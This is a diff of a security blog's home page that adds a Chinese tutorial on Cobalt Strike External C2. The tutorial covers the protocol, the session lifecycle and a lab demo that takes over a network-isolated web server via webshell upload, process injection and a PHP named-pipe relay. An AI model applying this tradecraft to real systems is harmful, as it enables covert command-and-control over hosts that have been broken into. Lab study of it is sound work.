@@ -2,124 +2,79 @@
 
 
 
-  
 
 
-<html class="theme-next mist use-motion" lang="zh-Hans">
+<html lang="zh-Hans">
 <head>
-  <meta charset="UTF-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.5.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.0">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.0" color="#222">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.0">
 
 
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
 
 
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '7.4.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'Kopieren',
+      copy_success: 'Kopiert',
+      copy_failure: 'Kopieren fehlgeschlagen'
+    },
+    sidebarPadding: 40
+  };
+</script>
 
-
-
-
-
-<meta http-equiv="Cache-Control" content="no-transform" />
-<meta http-equiv="Cache-Control" content="no-siteapp" />
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  
-  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
-
-
-
-
-
-
-
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
-
-<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
-
-
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
-
-
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
-
-
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
-
-
-  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
-
-
-
-
-
-  <meta name="keywords" content="信息安全, 黑客技术, 渗透测试, 信安, 黑客, 渗透, security, hacker, hl0rey" />
-
-
-
-
-
-
-
-
-
-
-<meta property="og:type" content="website">
+  <meta property="og:type" content="website">
 <meta property="og:title" content="hl0rey&#39;s blog">
 <meta property="og:url" content="http://hl0rey.github.io/index.html">
 <meta property="og:site_name" content="hl0rey&#39;s blog">
 <meta property="og:locale" content="zh-Hans">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="hl0rey&#39;s blog">
+  <link rel="canonical" href="http://hl0rey.github.io/">
 
 
-
-<script type="text/javascript" id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Mist',
-    version: '5.1.4',
-    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
-    fancybox: true,
-    tabs: true,
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    duoshuo: {
-      userId: '0',
-      author: '博主'
-    },
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    }
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: true,
+    isPost: false,
+    isPage: false,
+    isArchive: false
   };
 </script>
-
-
-
-  <link rel="canonical" href="http://hl0rey.github.io/"/>
-
-
-
-
 
   <title>hl0rey's blog</title>
   
@@ -131,38 +86,51 @@
 
 
 
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
-
-  
-  
-    
-  
-
-  <div class="container sidebar-position-left 
-  page-home">
+  <div class="container use-motion">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta ">
-    
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
 
-    <div class="custom-logo-site-title">
-      <a href="/"  class="brand" rel="start">
+    <div>
+      <a href="/" class="brand" rel="start">
         <span class="logo-line-before"><i></i></span>
         <span class="site-title">hl0rey's blog</span>
         <span class="logo-line-after"><i></i></span>
       </a>
     </div>
-      
-        <p class="site-subtitle"></p>
-      
   </div>
 
   <div class="site-nav-toggle">
-    <button>
+    <button aria-label="Navigationsleiste an/ausschalten">
       <span class="btn-bar"></span>
       <span class="btn-bar"></span>
       <span class="btn-bar"></span>
@@ -170,85 +138,58 @@
   </div>
 </div>
 
+
 <nav class="site-nav">
   
-
-  
-    <ul id="menu" class="menu">
+  <ul id="menu" class="menu">
+      
+      
       
         
         <li class="menu-item menu-item-home">
-          <a href="/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
-            
-            首页
-          </a>
-        </li>
       
-        
-        <li class="menu-item menu-item-tags">
-          <a href="/tags/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
-            
-            标签
-          </a>
-        </li>
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Startseite</a>
+
+  </li>
       
-        
-        <li class="menu-item menu-item-categories">
-          <a href="/categories/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
-            
-            分类
-          </a>
-        </li>
+      
       
         
         <li class="menu-item menu-item-archives">
-          <a href="/archives/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
-            
-            归档
-          </a>
-        </li>
       
+    
 
-      
-    </ul>
-  
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archiv</a>
 
-  
+  </li>
+  </ul>
+
+    
+
 </nav>
-
-
-
- </div>
+</div>
     </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
 
     <main id="main" class="main">
       <div class="main-inner">
         <div class="content-wrap">
           <div id="content" class="content">
             
-  <section id="posts" class="posts-expand">
-    
-      
-
-  
-
+  <div id="posts" class="posts-expand">
+        <article itemscope itemtype="http://schema.org/Article">
   
   
   
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
+  <div class="post-block home">
     <link itemprop="mainEntityOfPage" href="http://hl0rey.github.io/2019/09/06/利用External-C2让内网机器在Cobalt-Strike中上线/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -260,53 +201,38 @@
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="hl0rey's blog">
     </span>
-
-    
       <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/09/06/利用External-C2让内网机器在Cobalt-Strike中上线/" itemprop="url">利用External C2让内网机器在Cobalt Strike中上线</a></h1>
-        
+        <h1 class="post-title" itemprop="name headline">
+            
+            <a href="/2019/09/06/利用External-C2让内网机器在Cobalt-Strike中上线/" class="post-title-link" itemprop="url">利用External C2让内网机器在Cobalt Strike中上线</a>
+          
+        </h1>
 
         <div class="post-meta">
-          <span class="post-time">
-            
+            <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="fa fa-calendar-o"></i>
               </span>
+              <span class="post-meta-item-text">Veröffentlicht am</span>
+
               
-                <span class="post-meta-item-text">发表于</span>
+                
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-06T09:18:29+08:00">
-                2019-09-06
-              </time>
-            
 
-            
-
-            
-          </span>
-
+              <time title="Erstellt: 2019-09-06 09:18:29 / Geändert am: 09:24:40" itemprop="dateCreated datePublished" datetime="2019-09-06T09:18:29+08:00">2019-09-06</time>
+            </span>
           
-            <span class="post-category" >
             
-              <span class="post-meta-divider">|</span>
+
             
+          
+            <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="fa fa-folder-o"></i>
               </span>
+              <span class="post-meta-item-text">in</span>
               
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/pentest/" itemprop="url" rel="index">
-                    <span itemprop="name">pentest</span>
-                  </a>
-                </span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">pentest</span></a></span>
 
                 
                 
@@ -315,21 +241,9 @@
           
 
           
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
 
         </div>
       </header>
-    
 
     
     
@@ -337,69 +251,394 @@
     <div class="post-body" itemprop="articleBody">
 
       
-      
+          <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>想了很多题目，感觉都不合适，比如，初探External C2、小白学External C2、通过端口复用让无法主动出网内网机器在CS上线、菜鸡玩Cobalt Strike等等。</p>
+<p>标题不能起的太长，又不想当标题党，所以就在开头把题目和测试环境先讲清楚。目标将内网一台web服务器的80端口映射出来，但是此web服务器是不能出网的。目标不能出网，但你又想用CS（内网直接connect别的主机，多舒服）。</p>
+<p>本文是通过实现这样的功能的一个小Demo来介绍下external C2这个功能。</p>
+<p>Demo代码地址：<a href="https://github.com/hl0rey/Web_ExternalC2_Demo" target="_blank" rel="noopener">https://github.com/hl0rey/Web_ExternalC2_Demo</a></p>
+<h3 id="externalC2介绍"><a href="#externalC2介绍" class="headerlink" title="externalC2介绍"></a>externalC2介绍</h3><p>因为我这篇文章是面向新手的（尤其是external C2介绍部分，大佬可以略过），希望不熟悉externalC2的朋友能够在看完这篇文章之后，也能自己尝试着手自定义C2通信来适应不同的场景。</p>
+<h4 id="什么是externalC2"><a href="#什么是externalC2" class="headerlink" title="什么是externalC2"></a>什么是externalC2</h4><p>就如这个单词的字面意思一样：额外的C2。externalC2是cobalt strike开放给用户的接口。利用这个特性，用户让自己编写的程序在cobalt strike的teamserver和beacon之间处理C2通信的过程，也就是充当“翻译”的角色。</p>
+<h4 id="externalC2的基本架构"><a href="#externalC2的基本架构" class="headerlink" title="externalC2的基本架构"></a>externalC2的基本架构</h4><p>完成一次externalC2通信逻辑上需要五个部分参与：</p>
+<ul>
+<li><p>团队服务器（Teamserver）</p>
+<p>cobalt strike的核心部分，一切功能的基础。</p>
+</li>
+<li><p>Exterlnal C2 服务器（External C2 server）</p>
+<p>依托于Teamserver启动的External C2服务，将开启一个端口，接收传入的请求。</p>
+</li>
+<li><p>第三方控制器（Third-party Controller）</p>
+<p>自己编写的与External C2 server 直接交互的程序，一般用来把第三方客户端传回的信息，翻译成External C2 server能懂的格式。</p>
+</li>
+<li><p>第三方客户端（Third-party Client）</p>
+<p>用来获取被控端的基本信息和执行CS下发的payload的程序。</p>
+</li>
+<li><p>Beacon（SMB Beacon）</p>
+<p>CS功能的基础，一切的由CS下发的命令，最终都交由它来执行。</p>
+</li>
+</ul>
+<p>由于官方的架构图是英文的，看起来没有亲切感，所以我再画一遍。</p>
+<p><img src="/2019/09/06/利用External-C2让内网机器在Cobalt-Strike中上线/externalC2.png" alt=""></p>
+<p>从图中可以看出，使用External C2对我们最基本的要求是</p>
+<ul>
+<li>编写一个第三方控制器，该控制器可以通过TCP连接向EternalC2服务器发送数据和从ExternalC2服务器接收数据，并且能与第三方客户端进行通信。</li>
+<li>编写一个第三方客户端，可以启动Beacon，并且能通过命名管道与Beacon进行交互，还要能与第三方控制器进行通信。</li>
+</ul>
+<h4 id="ExternalC2的通信协议"><a href="#ExternalC2的通信协议" class="headerlink" title="ExternalC2的通信协议"></a>ExternalC2的通信协议</h4><p>看代码是最能熟悉它的通信协议的方式，这里只介绍几个关键的点。</p>
+<ul>
+<li>无认证的帧格式。</li>
+<li>先是一个长度为四字节的小端字节序的表示长度的值（高级语言可能会使用大端字节序序列化数字为流，所以得保证这个数字得按照小端字节序序列化）。</li>
+<li>根据长度读取真正的数据部分，也就是说要完成一次对结果的读取，要先读长度，在读内容。</li>
+<li>进行写入操作时也是需要符合该格式。</li>
+<li>与external C2服务器的通信，以及与命名管道的通信都遵循这个格式。</li>
+</ul>
+<h4 id="External-C2组件"><a href="#External-C2组件" class="headerlink" title="External C2组件"></a>External C2组件</h4><h5 id="External-C2-服务器"><a href="#External-C2-服务器" class="headerlink" title="External C2 服务器"></a>External C2 服务器</h5><p>从客户端加载contana脚本即可。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">externalc2_start(&quot;0.0.0.0&quot;,2222);</span><br></pre></td></tr></table></figure>
+<h5 id="第三方控制器"><a href="#第三方控制器" class="headerlink" title="第三方控制器"></a>第三方控制器</h5><p>想让被控端上线的时候，就先向external C2服务器请求建立一个会话，发送被控端的相关配置，服务端会返还需要执行的Payload。每一个链接对应一个会话。</p>
+<p>具体细节是：</p>
+<p>首先设置当前会话，就是向External C2 服务器发送被控端的相关信息，发送一个或多个数据包中包含key=value格式的键值对。具体格式如下：</p>
+<table>
+<thead>
+<tr>
+<th>选项</th>
+<th>默认值</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>arch</td>
+<td>x86</td>
+<td>payload的位数，可接受的值：x86、x64</td>
+</tr>
+<tr>
+<td>pipename</td>
+<td></td>
+<td>命名管道的名字</td>
+</tr>
+<tr>
+<td>block</td>
+<td>100</td>
+<td>以毫秒为单位的时间，没有操作的时候，external C2应该阻塞多长时间，应该相当于sleep</td>
+</tr>
+</tbody>
+</table>
+<p>设置发送完毕之后，向external C2 服务器发送一个字符串 go，然后等external C2 服务器返回payload，第三方控制器需要把payload中继到第三方客户端，并且有第三方客户端执行它。当第三方控制器从external C2 服务器断开连接时，teamserver就会把当前连接对应的会话标记为失效会话，目前没有办法恢复已死的会话。（经过我对其协议的学习，感觉官方文档这句还是有有点绝对的，应该是存在断线重连的方法的。）</p>
+<h5 id="第三方客户端"><a href="#第三方客户端" class="headerlink" title="第三方客户端"></a>第三方客户端</h5><p>第三方客户端负责执行从第三方控制端接收到的payload。该payload是一个头部经过修改的可以自我引导、反射加载的DLL（关于这部分内容可以参考参考链接中的pe_to_shellcode）。用通常的进程注入技术就可以执行它。当payload处于运行状态时，第三方客户端即可以通过对前一阶段会话配置时设置的命名管道名称（</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\.\pipe\[pipe name]</span><br></pre></td></tr></table></figure>
+<p>）的读写操作来与Beacon交互。</p>
+<h5 id="会话生命周期"><a href="#会话生命周期" class="headerlink" title="会话生命周期"></a>会话生命周期</h5><table>
+<thead>
+<tr>
+<th>Teamserver</th>
+<th>External C2服务器</th>
+<th>第三方控制器</th>
+<th>第三方客户端</th>
+<th>SMB Beacon</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td>向控制器请求建立一个新的会话</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td>连接到External C2服务器</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td>向External C2发送会话配置</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td>向External C2请求stage（payload）</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>把stage发给第三方控制器</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td>中继stage给第三方客户端</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td>把stage注入某进程</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td>启动命名管道服务器</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td>连接到命名管道服务器</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td>向第三方客户端发送metadata</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td>中继metadata给第三方控制器</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td>中继metadata给external C2服务器</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>处理metadata</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>Coabalt   strike中出现了一个新的会话</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>用户下发任务或者不下发</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>向第三方控制器发送任务</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td>中继任务</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td>中继任务</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td>处理任务</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td>向第三方客户端发送任务结果</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td>中继任务结果</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td>中继任务结果</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>处理任务结果</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>显示结果</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>当会话存活的时候，重复从出现会话到显示结果的过程</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td>会话退出</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td>读写命名管道出错</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td>通知第三方控制器退出会话</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td>与External C2 服务器断开连接</td>
+<td>退出</td>
+</tr>
+</tbody>
+</table>
+<p>推荐看下官方的示例代码，我顺便一起放到了Demo代码中。</p>
+<h3 id="实现目的的基本思路"><a href="#实现目的的基本思路" class="headerlink" title="实现目的的基本思路"></a>实现目的的基本思路</h3><p>实现目的主要有以下需要考虑的点：</p>
+<ul>
+<li><p>问题：当payload成功执行之后，需要由第三方客户端完全接管与Beacon的交互。</p>
+<p>解决方案：所有与Beacon后续的交互，最终均是对命名管道的读写。命名管道可以直接作为文件来读写，多数脚本语言都支持该功能。</p>
+</li>
+<li><p>问题：因为目标不能出网，所以就无法向第三方客户端主动请求建立会话，也就是说按照官方生命周期的描述是无法建立会话的。</p>
+<p>解决方案：其实这一步不是必要，可以省略，或者将其变为第三方控制器先向External C2服务器请求payload，然后将payload直接发送给第三方客户端，让它执行即可。</p>
+</li>
+<li><p>问题：Beacon返回执行结果时，无法主动向外发送数据。</p>
+<p>解决方案：可以在第三方控制器对第三方控制器进行轮询解决该问题。会话退出的消息同理。</p>
+</li>
+</ul>
+<p>这个需求的难点在于把所有第三方控制器、Beacon主动对外的访问都转化为第三方控制器对第三方客户端的请求，变主动为被动。</p>
+<h3 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h3><p>主要有3个模块参与：</p>
+<p>第三方控制器：保存payload和轮询第三方客户端；</p>
+<p>第三方客户端A：payload执行与管道中继；</p>
+<p>第三方客户端B：第三方控制器请求中继）。</p>
+<p>官方的会话生命周期描述不符合当前需求，符合当前的需求的会话生命周期如下：</p>
+<ul>
+<li>在webshell里确定目标服务器的类型，第三方控制器向External C2服务器请求payload，并将返回的paylaod保存起来。</li>
+<li>根据保存起来的payload生成可加载payload的可执行文件，也就是为了用第三方客户端执行payload而做准备。</li>
+<li>通过webshell把第三方客户端A和payload传送到目标机器上，并且执行。</li>
+<li>将第三方客户端B（符合目标服务器环境的web服务端脚本）传送到目标web路径下，后续的与第三方客户端A的交互，由它完成。</li>
+<li>告知第三方控制器上一步上传的服务端脚本（第三方客户端B）的路径。</li>
+<li>第三方控制器命令第三方客户端B从第三方客户端A获取metadata，第三方客户端A获取metadata并且回传。</li>
+<li>第三方控制器将获取到的metadata发送给External C2服务器，此时Cobalt strike中已经出现上线的机器。</li>
+<li>第三方控制器将任务下发给第三方客户端，并开始轮询是否有结果返回（时间间隔可以长一些，频繁的访问不是好事）。</li>
+<li>第三方控制器轮询第三方客户端时，发现其返回来命名管道读写失败的信息，第三方控制器断开与External C2服务器的连接。</li>
+</ul>
+<p>第三方控制器python编写，因为涉及到HTTP请求，可以直接使用requests库。第三方客户端分为两个部分，分别用C和PHP编写，C的部分负责保持与Beacon命名管道的持久连接（为了不让beacon认为自己掉线了），并且创建管道供PHP部分读写，PHP部分负责将数据中继出来，返回给第三方控制器。</p>
+<h3 id="功能测试"><a href="#功能测试" class="headerlink" title="功能测试"></a>功能测试</h3><p>环境准备：</p>
+<p>一台win7，普通客户机（虚拟机）</p>
+<p>一台win10，web服务器，有php运行环境（我的物理机）</p>
+<p>一台kali，攻击机，cobalt strike3.13运行External C2服务（虚拟机）</p>
+<p>前期先把C程序编译好，我使用VS2019编写并编译可以正常使用。</p>
+<p><img src="/2019/09/06/利用External-C2让内网机器在Cobalt-Strike中上线/1.png" alt=""></p>
+<p>启动TeamServer，使用客户端连接TeamServer，并且加载externalc2.cna。</p>
+<p><img src="/2019/09/06/利用External-C2让内网机器在Cobalt-Strike中上线/2.png" alt=""></p>
+<p>服务端出现这个就成功了。</p>
+<p><img src="/2019/09/06/利用External-C2让内网机器在Cobalt-Strike中上线/3.png" alt=""></p>
+<p>执行第三方控制器，事先需在第三方控制器脚本中配置好External C2服务器的地址。脚本将payload保存在脚本当前路径下的payload目录中，名为payload.bin。</p>
+<p><img src="/2019/09/06/利用External-C2让内网机器在Cobalt-Strike中上线/4.png" alt=""></p>
+<p>接下来，将第三方客户端以及payload上传至目标服务器，也就是win10上。</p>
+<p><img src="/2019/09/06/利用External-C2让内网机器在Cobalt-Strike中上线/5.png" alt=""></p>
+<p>先启动一个notepad，因为默认情况下会把payload注入进notepad进程。然后先后运行RemoteThreadInject.exe和PipeOperationRelay.exe。当看到all pipe are ok。就说明程序运行所需要的所有管道都建立好了。</p>
+<p><img src="/2019/09/06/利用External-C2让内网机器在Cobalt-Strike中上线/6.png" alt=""></p>
+<p>然后去第三方控制器里配置上传的piperw.php的url。</p>
+<p><img src="/2019/09/06/利用External-C2让内网机器在Cobalt-Strike中上线/7.png" alt=""></p>
+<p>回车之后，上线成功。</p>
+<p><img src="/2019/09/06/利用External-C2让内网机器在Cobalt-Strike中上线/8.png" alt=""></p>
+<p>测试下功能是否正常，查看进程。</p>
+<p><img src="/2019/09/06/利用External-C2让内网机器在Cobalt-Strike中上线/9.png" alt=""></p>
+<p>测试TCP Beacon，在另一台主机上执行TCP Beacon。</p>
+<p><img src="/2019/09/06/利用External-C2让内网机器在Cobalt-Strike中上线/10.png" alt=""></p>
+<p>可以正常进行链接。</p>
+<p><img src="/2019/09/06/利用External-C2让内网机器在Cobalt-Strike中上线/书籍资料\用伪端口复用让无法出网机器在CS中上线\img\11.png" alt=""></p>
+<p>测试TCP Beacon的功能。</p>
+<p>查看进程：</p>
+<p><img src="/2019/09/06/利用External-C2让内网机器在Cobalt-Strike中上线/12.png" alt=""></p>
+<p>查看文件：</p>
+<p><img src="/2019/09/06/利用External-C2让内网机器在Cobalt-Strike中上线/13.png" alt="13"></p>
+<h3 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h3><ul>
+<li>每次断开与命名管道的连接，再次打开时，必须重新发送上线包，在这上边栽了三天，才发现这个问题。最终通过写一个管道访问中继程序解决了这个问题，断开命名管道的连接，beacon就认为自己掉线了。</li>
+<li>php的recourse指针无法放到session中。但这个不能叫坑，正常可以理解的特性。</li>
+<li>有些东西做出来之后，才知道有没有用。External C2表现并不好，在一些操作上表现出了极差的稳定性，看到官网的文档是2016年，也许作者并没有把重心放在这上边，因为不是开源的，别人也没法帮他，只能等着了。</li>
+<li>因为是测试代码，所以保留了很多调试输出。</li>
+<li>我用win10做web服务器是因为想下周干点别的，不想解决兼容性问题了。</li>
+</ul>
+<p><img src="/2019/09/06/利用External-C2让内网机器在Cobalt-Strike中上线/14.png" alt=""></p>
+<h3 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h3><p><a href="https://github.com/hasherezade/pe_to_shellcode" target="_blank" rel="noopener">https://github.com/hasherezade/pe_to_shellcode</a></p>
+<p><a href="https://docs.microsoft.com/zh-cn/windows/win32/ipc/pipes" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/windows/win32/ipc/pipes</a></p>
+<p><a href="https://blog.xpnsec.com/exploring-cobalt-strikes-externalc2-framework/" target="_blank" rel="noopener">https://blog.xpnsec.com/exploring-cobalt-strikes-externalc2-framework/</a></p>
+<p><a href="https://github.com/Und3rf10w/external_c2_framework" target="_blank" rel="noopener">https://github.com/Und3rf10w/external_c2_framework</a></p>
+<p><a href="https://www.cobaltstrike.com/help-externa" target="_blank" rel="noopener">https://www.cobaltstrike.com/help-externa</a></p>
 
-      
-        
-          
-          前言想了很多题目，感觉都不合适，比如，初探External C2、小白学External C2、通过端口复用让无法主动出网内网机器在CS上线、菜鸡玩Cobalt Strike等等。
-标题不能起的太长，又不想当标题党，所以就在开头把题目和测试环境先讲清楚。目标将内网一台web服务器的80端口映射出来，
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2019/09/06/利用External-C2让内网机器在Cobalt-Strike中上线/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
         
       
     </div>
-    
-    
-    
-    <div>
-      
-    </div>
-    
 
     
-
     
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
+    
+      <footer class="post-footer">
+          <div class="post-eof"></div>
+        
+      </footer>
   </div>
   
   
   
   </article>
 
-
     
-      
-
-  
-
+        <article itemscope itemtype="http://schema.org/Article">
   
   
   
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
+  <div class="post-block home">
     <link itemprop="mainEntityOfPage" href="http://hl0rey.github.io/2019/07/18/mimikatz中的tspkg、MSV1-0、WDigest、kerberos/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -411,53 +650,38 @@
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="hl0rey's blog">
     </span>
-
-    
       <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/07/18/mimikatz中的tspkg、MSV1-0、WDigest、kerberos/" itemprop="url">mimikatz中的tspkg、MSV1_0、WDigest、kerberos</a></h1>
-        
+        <h1 class="post-title" itemprop="name headline">
+            
+            <a href="/2019/07/18/mimikatz中的tspkg、MSV1-0、WDigest、kerberos/" class="post-title-link" itemprop="url">mimikatz中的tspkg、MSV1_0、WDigest、kerberos</a>
+          
+        </h1>
 
         <div class="post-meta">
-          <span class="post-time">
-            
+            <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="fa fa-calendar-o"></i>
               </span>
+              <span class="post-meta-item-text">Veröffentlicht am</span>
+
               
-                <span class="post-meta-item-text">发表于</span>
+                
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-18T10:40:27+08:00">
-                2019-07-18
-              </time>
-            
 
-            
-
-            
-          </span>
-
